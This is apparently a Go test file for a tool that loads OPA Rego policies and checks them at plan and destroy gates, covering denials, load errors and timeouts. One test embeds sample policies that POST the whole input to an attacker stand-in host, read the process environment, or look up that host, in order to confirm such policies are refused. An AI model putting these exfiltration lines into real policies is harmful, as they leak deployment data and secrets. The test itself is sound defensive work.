package policy

import (
	"context"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/evatt-labs/kraai/internal/manifest"
)

// manifestWith writes each policy under the manifest's policies directory.
func manifestWith(t *testing.T, policies map[string]string) manifest.FS {
	t.Helper()
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ManifestDir), 0o750); err != nil {
		t.Fatal(err)
	}
	for name, source := range policies {
		if err := os.WriteFile(filepath.Join(dir, ManifestDir, name), []byte(source), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	fsys, err := manifest.NewFS(dir)
	if err != nil {
		t.Fatal(err)
	}
	return fsys
}

const noNAT = `package kraai.plan

deny contains msg if {
	some action in input.actions
	action.vendor_type == "AWS::EC2::NatGateway"
	input.overlay.kind == "ephemeral"
	msg := sprintf("%s: an ephemeral environment may not carry a NAT gateway", [action.binding])
}
`

var planInput = map[string]any{
	"overlay": map[string]any{"kind": "ephemeral"},
	"actions": []any{
		map[string]any{"binding": "NET", "vendor_type": "AWS::EC2::NatGateway"},
		map[string]any{"binding": "JOBS", "vendor_type": "AWS::SQS::Queue"},
	},
}

func TestNoPoliciesDenyNothing(t *testing.T) {
	set, err := Load(manifestWith(t, nil), nil)
	if err != nil || !set.Empty() {
		t.Fatalf("Load = %+v, %v", set, err)
	}
	if denials, err := set.Evaluate(context.Background(), GatePlan, planInput); err != nil || denials != nil {
		t.Fatalf("Evaluate = %v, %v", denials, err)
	}
}

func TestPlanPolicyDenies(t *testing.T) {
	set, err := Load(manifestWith(t, map[string]string{"nat.rego": noNAT}), nil)
	if err != nil {
		t.Fatal(err)
	}
	denials, err := set.Evaluate(context.Background(), GatePlan, planInput)
	if err != nil || !reflect.DeepEqual(denials, []string{"NET: an ephemeral environment may not carry a NAT gateway"}) {
		t.Fatalf("Evaluate = %v, %v", denials, err)
	}
	// The destroy gate has no policy here, so it denies nothing.
	if denials, err := set.Evaluate(context.Background(), GateDestroy, planInput); err != nil || denials != nil {
		t.Fatalf("destroy gate = %v, %v", denials, err)
	}
	// Remove the violation and the plan passes.
	persistent := map[string]any{"overlay": map[string]any{"kind": "persistent"}, "actions": planInput["actions"]}
	if denials, err := set.Evaluate(context.Background(), GatePlan, persistent); err != nil || len(denials) != 0 {
		t.Fatalf("a persistent environment = %v, %v", denials, err)
	}
}

// Helpers under kraai.lib are usable; a message that is not a string is
// reported as its JSON; policies come from --policy files and directories.
func TestHelpersNonStringMessagesAndExtraPaths(t *testing.T) {
	extraDir := t.TempDir()
	lib := "package kraai.lib.names\n\nprotected(b) if b == \"DB\"\n"
	destroy := "package kraai.destroy\n\nimport data.kraai.lib.names\n\ndeny contains {\"binding\": a.binding} if {\n\tsome a in input.actions\n\tnames.protected(a.binding)\n}\n"
	if err := os.WriteFile(filepath.Join(extraDir, "lib.rego"), []byte(lib), 0o600); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(t.TempDir(), "destroy.rego")
	if err := os.WriteFile(file, []byte(destroy), 0o600); err != nil {
		t.Fatal(err)
	}
	set, err := Load(manifestWith(t, nil), []string{extraDir, file})
	if err != nil {
		t.Fatal(err)
	}
	denials, err := set.Evaluate(context.Background(), GateDestroy, map[string]any{"actions": []any{map[string]any{"binding": "DB"}}})
	if err != nil || !reflect.DeepEqual(denials, []string{`{"binding":"DB"}`}) {
		t.Fatalf("Evaluate = %v, %v", denials, err)
	}
}

// Denials are sorted as the text they print as. OPA orders a set by type,
// strings before arrays, which is not the order of their encodings.
func TestDenialsAreSortedAsPrinted(t *testing.T) {
	policy := "package kraai.plan\n\ndeny contains \"a\"\n\ndeny contains [\"x\"]\n"
	set, err := Load(manifestWith(t, map[string]string{"mixed.rego": policy}), nil)
	if err != nil {
		t.Fatal(err)
	}
	denials, err := set.Evaluate(context.Background(), GatePlan, map[string]any{})
	if err != nil || !reflect.DeepEqual(denials, []string{`["x"]`, "a"}) {
		t.Fatalf("Evaluate = %q, %v", denials, err)
	}
}

// A policy can arrive in the pull request it judges: nothing it runs may
// reach the network or read the process environment.
func TestForbiddenBuiltinsRefuseToLoad(t *testing.T) {
	for name, body := range map[string]string{
		"http.send":          `r := http.send({"method": "POST", "url": "https://evil.example", "body": input})`,
		"opa.runtime":        `r := opa.runtime().env`,
		"net.lookup_ip_addr": `r := net.lookup_ip_addr("evil.example")`,
	} {
		policy := "package kraai.plan\n\ndeny contains \"x\" if {\n\t" + body + "\n\tr\n}\n"
		_, err := Load(manifestWith(t, map[string]string{"leak.rego": policy}), nil)
		if err == nil || !strings.Contains(err.Error(), name) {
			t.Errorf("%s: Load = %v, want a refusal naming it", name, err)
		}
	}
}

// Every way a policy could silently never run is a load error.
func TestAPolicyThatWouldNeverRunFailsToLoad(t *testing.T) {
	for name, c := range map[string]struct {
		source, want string
	}{
		"misspelled package":    {strings.Replace(noNAT, "kraai.plan", "kraai.plans", 1), "declares package kraai.plans"},
		"misnamed rule":         {strings.Replace(noNAT, "deny contains", "denies contains", 1), "define no deny rule"},
		"a complete deny rule":  {"package kraai.plan\n\ndeny := \"no\"\n", "must be a set of messages"},
		"a syntax error":        {"package kraai.plan\n\ndeny contains msg if {\n", "parsing policy"},
		"an undefined function": {"package kraai.plan\n\ndeny contains \"x\" if not_a_builtin(1)\n", "not_a_builtin"},
	} {
		_, err := Load(manifestWith(t, map[string]string{"p.rego": c.source}), nil)
		if err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: Load = %v, want %q", name, err, c.want)
		}
	}
}

// Evaluation is bounded: apply holds the environment lock while it runs.
func TestEvaluationIsBounded(t *testing.T) {
	saved := evalTimeout
	evalTimeout = 200 * time.Millisecond
	t.Cleanup(func() { evalTimeout = saved })

	slow := "package kraai.plan\n\ndeny contains \"x\" if {\n\tsome i in numbers.range(1, 100000000)\n\ti < 0\n}\n"
	set, err := Load(manifestWith(t, map[string]string{"slow.rego": slow}), nil)
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	_, err = set.Evaluate(context.Background(), GatePlan, planInput)
	if err == nil || !strings.Contains(err.Error(), "took longer than") {
		t.Fatalf("Evaluate = %v, want the deadline reported", err)
	}
	if elapsed := time.Since(start); elapsed > 20*time.Second {
		t.Fatalf("evaluation ran %v past a 200ms deadline", elapsed)
	}
}
